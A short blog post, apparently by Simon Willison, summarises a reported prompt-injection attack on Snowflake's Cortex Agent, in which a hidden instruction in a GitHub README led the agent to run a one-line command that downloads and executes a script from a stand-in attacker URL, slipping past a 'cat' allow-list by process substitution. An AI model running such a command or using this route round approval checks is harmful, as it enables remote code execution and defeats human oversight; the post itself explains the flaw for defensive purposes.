# Snowflake Cortex AI Escapes Sandbox and Executes Malware

Posted 18th March 2026 by Simon Willison.

PromptArmor report on a prompt injection attack chain in Snowflake's Cortex Agent, now fixed.

The attack started when a Cortex user asked the agent to review a GitHub repository that had a prompt injection attack hidden at the bottom of the README.

The attack caused the agent to execute this code:

    cat < <(sh < <(wget -q0- https://ATTACKER_URL.com/bugbot))

Cortex listed `cat` commands as safe to run without human approval, without protecting against this form of process substitution that can occur in the body of the command.

I've seen allow-lists against command patterns like this in a bunch of different agent tools and I don't trust them at all — they feel inherently unreliable to me.

I'd rather treat agent commands as if they could do anything that process itself is allowed to do, hence my interest in deterministic sandboxes that operate outside of the layer of the agent itself.
